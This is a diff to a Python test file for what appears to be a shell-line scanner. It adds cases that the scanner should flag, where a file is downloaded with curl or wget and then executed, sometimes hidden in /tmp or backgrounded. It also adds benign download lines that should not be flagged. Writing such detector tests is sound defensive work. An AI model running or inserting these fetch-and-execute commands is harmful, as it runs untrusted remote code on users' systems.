@@ -65,6 +65,10 @@ def _ids(findings) -> set[str]:
         "curl -sLO https://get.example.invalid/download/patch1\nbash patch1",
         f"wget -q {URL} -O /tmp/i.sh\n. /tmp/i.sh",
         f"curl -s -o /tmp/.upd {URL}\nchmod +x /tmp/.upd\n/tmp/.upd >/dev/null 2>&1 &",
+        # Still run: `.` after `then`, a syntax check followed by a real start, other flags.
+        f"wget -q {URL} -O /tmp/i.sh\nif true; then . /tmp/i.sh; fi",
+        f'curl -fsSL -o "$T" {URL}\nbash -n "$T"\nbash "$T"',
+        f'curl -fsSL -o "$T" {URL}\nbash -ex "$T"',
     ],
 )
 def test_fetch_and_run_forms_are_a_risky_construct(tmp_path, line):
@@ -91,6 +95,11 @@ def test_fetch_and_run_forms_are_a_risky_construct(tmp_path, line):
         "curl -fsSL -o data.json https://api.example.com/data\n./process.sh data.json",
         # Printed for the person to run.
         f'echo "Install with: curl -fsSL {URL} | sh"',
+        # Registry diff 2026-11-22: a syntax check of the download (wisp-mcp), and jq's `.`
+        # filter over a downloaded JSON answer (compuute-scan-api).
+        f'curl -fsSL -o "$TMP" {URL}\nbash -n "$TMP"\ninstall -m 0755 "$TMP" /usr/local/bin/w',
+        f'curl -fsSL -o "$TMP" {URL}\nnode --check "$TMP"',
+        'curl -fsS -o "$TMP" https://api.example.com/scan\njq . "$TMP"',
     ],
 )
 def test_honest_shell_lines_stay_silent(tmp_path, line):
